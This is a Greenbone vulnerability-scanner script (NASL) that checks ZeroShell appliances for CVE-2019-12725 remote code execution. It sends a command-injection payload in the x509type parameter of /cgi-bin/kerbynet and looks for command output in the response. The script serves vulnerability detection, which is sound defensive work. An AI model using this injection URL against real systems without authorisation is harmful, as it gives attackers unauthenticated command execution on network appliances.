# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108947");
  script_version("2021-07-06T11:00:47+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2021-07-06 11:00:47 +0000 (Tue, 06 Jul 2021)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-05-13 18:15:00 +0000 (Thu, 13 May 2021)");
  script_tag(name:"creation_date", value:"2020-10-19 11:34:11 +0000 (Mon, 19 Oct 2020)");
  script_cve_id("CVE-2019-12725");
  script_name("ZeroShell < 3.9.3 RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://zeroshell.org/new-release-and-critical-vulnerability/");
  script_xref(name:"URL", value:"https://www.tarlogic.com/advisories/zeroshell-rce-root.txt");

  script_tag(name:"summary", value:"ZeroShell is prone to a remote code execution (RCE) vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view files or execute
  arbitrary script code in the context of the web server process. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a GET request, try to include a local file and check the response.");

  script_tag(name:"insight", value:"Input to the 'type' value in /cgi-bin/kerbynet is not properly sanitized.");

  script_tag(name:"solution", value:"Update to version 3.9.3 or later.");

  script_tag(name:"affected", value:"ZeroShell versions prior to 3.9.3.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("list_array_func.inc");

port = http_get_port(default:443);

buf = http_get_cache(item:"/", port:port);
if(!buf || ("<title>ZeroShell" >!< buf && "/cgi-bin/kerbynet" >!< buf))
  exit(0);

cmds = exploit_commands("linux");

foreach pattern(keys(cmds)) {

  cmd = cmds[pattern];

  url = "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A" + cmd + "%0A'";
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);

  if(match = egrep(string:buf, pattern:pattern)) {

    info['1. URL'] = http_report_vuln_url(port:port, url:url, url_only:TRUE);
    info['2. Used command'] = cmd;
    info['3. Expected result'] = pattern;

    report  = 'By doing the following request:\n\n';
    report += text_format_table(array:info) + '\n\n';
    report += 'it was possible to execute a command on the target.';
    report += '\n\nResult: ' + chomp(match);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
